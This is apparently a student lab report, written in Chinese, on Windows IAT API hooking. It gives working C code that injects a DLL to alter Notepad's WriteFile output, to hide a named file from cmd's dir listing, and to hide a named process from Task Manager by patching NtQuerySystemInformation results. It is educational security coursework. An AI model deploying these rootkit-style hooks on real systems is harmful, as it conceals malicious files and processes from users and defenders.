# API Hook

## 实验要求

- [x] 使用记事本写文件时，`hahaha`变成`hehehe`
- [x] `dir`遍历，越过显示指定文件
- [x] 任务管理器无法遍历显示指定进程

## 实验过程

### hook WriteFile

- 使用`dumpbin /imports C:/Windows/SysWOW64/notepad.exe`
  - `WriteFile`位于`KERNEL32.DLL`
- [IATHook](https://github.com/tinysec/iathook/blob/master/IATHook.c)使用第三方提供的函数
- 编写`hook-WriteFile.c`，并生成`hooklib.dll`（由于并不需要导出函数，因此其`exp.def`仅含有`LIBRARY  hooklib`一条语句）
- 该 DLL 使得其被加载时执行`IATHook`操作，从而将原`WriteFlie`函数的地址替换为`Fake_WriteFile`函数的地址
    ```c
    // hook-WriteFile.c
    #include<Windows.h>

    // 函数定义在 IATHook.c 中
    LONG IATHook(
        __in_opt void* pImageBase,
        __in_opt char* pszImportDllName,
        __in char* pszRoutineName,
        __in void* pFakeRoutine,
        __out HANDLE* phHook);

    void* GetIATHookOrign(__in HANDLE hHook);

    HANDLE g_hHook_WriteFile = NULL;
    typedef BOOL(__stdcall * LPFN_WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,
        LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);

    BOOL __stdcall Fake_WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,
        LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
    {
        LPFN_WriteFile fnOrigin = (LPFN_WriteFile)GetIATHookOrign(g_hHook_WriteFile);

        if (strcmp(lpBuffer, "hahaha") == 0)
            lpBuffer = "hehehe";

        // 调用原始的 WriteFile 函数
        return fnOrigin(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
    }

    BOOL WINAPI DllMain(
        HINSTANCE hinstDLL,  // handle to DLL module
        DWORD fdwReason,     // reason for calling function
        LPVOID lpReserved)  // reserved
    {
        // Perform actions based on the reason for calling.
        switch (fdwReason)
        {
        case DLL_PROCESS_ATTACH:
            // Initialize once for each new process.
            IATHook(
                GetModuleHandleW(NULL),
                "kernel32.dll",
                "WriteFile",
                Fake_WriteFile,
                &g_hHook_WriteFile
            );
            // Return FALSE to fail DLL load.
            break;
        }
        return TRUE;  // Successful DLL_PROCESS_ATTACH.
    }
    ```
- 为远程进程创建加载 DLL 的线程可以直接使用 [lab0x07 DLL Injection](../lab0x07&#32;DLL&#32;Injection/README.md) 中的攻击函数，但主函数中 DLL 的路径需要修改
- 注入成功、远程线程结束后，`IATHook`的效果对当前被注入进程永久有效
- 点击 GIF 查看 hook-WriteFile 完整操作视频<br>

  [<img src="img/hook-WriteFile.gif" alt="操作演示" width=450>](https://pan.baidu.com/s/1BvZz7kvtdoFDD0E78cTEXQ)

### hook FindNextFileW

- `cmd.exe`中的`dir`命令使用`FindFirstFileW`函数和`FindNextFileW`函数来遍历指定目录，并获得目录下所有文件
  - 使用`Dependency`查看，`FindFirstFileW`函数和`FindNextFileW`函数均位于`KERNEL32.DLL`（由于`KERNEL32.DLL`在`cmd.exe`的导入库中属于子模块，使用`dumpbin`无法获知，当然直接看文档也是可以的）

  <img src="img/imports.jpg" alt="查看导出函数所属模块" width=500>

  - 后来经实验发现使用`KERNEL32.DLL`作为导入模块名会导致钩取失败。`IATHook.c`中有一段代码`_stricmp(pszImportDllName , pHookBlock->pszImportDllName)`是寻找与传入模块名参数匹配的导入模块，打印输出后发现实际参与匹配的还是`api-ms-win-core-file-l1-1-0.dll`（事实证明，其实使用`dumpbin`也是可以的）：<br>
![实际参与匹配的模块名](img/actual-used.jpg)
- `FindFirstFileW`函数用于获取目录句柄，遍历目录使用的是`FindNextFileW`函数，因此只需要钩取`FindNextFileW`函数
  ```c
  // 类似 hook-WriteFile.c，编写 Fake_FindNextFileW 函数
  HANDLE g_hHook_FindNextFileW = NULL;
  typedef BOOL(__stdcall* LPFN_FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);

  BOOL WINAPI Fake_FindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
  {
	  LPFN_FindNextFileW fnOrigin = (LPFN_FindNextFileW)GetIATHookOrign(g_hHook_FindNextFileW);
	  BOOL status = fnOrigin(hFindFile, lpFindFileData);
	  if (wcscmp(lpFindFileData->cFileName, L"CreateRemoteThread.exe") == 0)
      // 当遇到文件名为 CreateRemoteThread.exe 的文件，就再获取下一个，这样就越过了
		  status = fnOrigin(hFindFile, lpFindFileData);
	  return status;
  }

  // 修改 DLLMain 中调用 IATHook 函数的传入参数
  IATHook(
		GetModuleHandleW(NULL),
		"API-MS-WIN-CORE-FILE-L1-1-0.dll",
		"FindNextFileW",
		Fake_FindNextFileW,
		&g_hHook_FindNextFileW
  );
  ```
- 实验效果展示，可以看到被攻击的`cmd.exe`使用`dir`时，无法显示目录下的`CreateRemoteThread.exe`：<br>

  <img src="img/display-none.jpg" alt="成功隐藏" width=600>

### 隐藏进程

- 要列出当前进程列表，调用地并不是类似之前显而易见的`Process32First`和`Process32Next`函数，而是位于`ntdll.dll`的`NtQuerySystemInformation`函数
- 编写`Fake_NtQuerySystemInformation`函数
    ```c
    // 需要添加的头文件
    #include <winternl.h>

    // winternl.h 中没有，需要手动添加的数据类型定义
    #define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
    typedef struct _MY_SYSTEM_PROCESS_INFORMATION
    {
        ULONG                   NextEntryOffset;
        ULONG                   NumberOfThreads;
        LARGE_INTEGER           Reserved[3];
        LARGE_INTEGER           CreateTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           KernelTime;
        UNICODE_STRING          ImageName;
        ULONG                   BasePriority;
        HANDLE                  ProcessId;
        HANDLE                  InheritedFromProcessId;
    } MY_SYSTEM_PROCESS_INFORMATION, * PMY_SYSTEM_PROCESS_INFORMATION;

    HANDLE g_hHook_NtQuerySystemInformation = NULL;
    typedef NTSTATUS(__stdcall* LPFN_NtQuerySystemInformation)(
        IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
        OUT PVOID                   SystemInformation,
        IN ULONG                    SystemInformationLength,
        OUT PULONG                  ReturnLength
        );

    NTSTATUS WINAPI Fake_NtQuerySystemInformation(
        IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
        OUT PVOID                   SystemInformation,
        IN ULONG                    SystemInformationLength,
        OUT PULONG                  ReturnLength
    )
    {
        LPFN_NtQuerySystemInformation fnOrigin = (LPFN_NtQuerySystemInformation)GetIATHookOrign(g_hHook_NtQuerySystemInformation);
        NTSTATUS status = fnOrigin(SystemInformationClass,
            SystemInformation,
            SystemInformationLength,
            ReturnLength);
        if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
        {
            // Loop through the list of processes
            PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
            PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)
                SystemInformation;
            do
            {
                pCurrent = pNext;
                pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->
                    NextEntryOffset);
                if (!wcsncmp(pNext->ImageName.Buffer, L"Calculator.exe", pNext->ImageName.Length))
                {
                    if (0 == pNext->NextEntryOffset)
                        pCurrent->NextEntryOffset = 0;
                    else
                        pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                    pNext = pCurrent;
                }
            } while (pCurrent->NextEntryOffset != 0);
        }
        return status;
    }
    ```
- 修改`DLLMain`中调用`IATHook`函数的传入参数
    ```c
    IATHook(
                GetModuleHandleW(NULL),
                "ntdll.dll",
                "NtQuerySystemInformation",
                Fake_NtQuerySystemInformation,
                &g_hHook_NtQuerySystemInformation
            );
    ```
- 被钩取的任务管理器与「逍遥」的计算器进程：<br>
![计算器进程成功隐藏](img/hidden-process-taskmgr.jpg)
- 上述方法并不适用于`tasklist.exe`

## 实验总结

- 以`dumpbin`中显示的导入模块名为准
- 即使是已经封装好的可执行文件也是可以修改其调用函数的动作
- 只要知道调用接口就可以尝试替换原函数

## 参考资料

- [iathook](https://github.com/tinysec/iathook)
- [WriteFile function](https://docs.microsoft.com/zh-cn/windows/win32/api/fileapi/nf-fileapi-writefile)
- [FindNextFileW function](https://docs.microsoft.com/zh-cn/windows/win32/api/fileapi/nf-fileapi-findnextfilew)
- [Listing the Files in a Directory](https://docs.microsoft.com/zh-cn/windows/win32/fileio/listing-the-files-in-a-directory)
- [wcscmp](http://www.cplusplus.com/reference/cwchar/wcscmp/)
- [Windows API Hooking Tutorial (Example with DLL Injection)](https://www.apriorit.com/dev-blog/160-apihooks)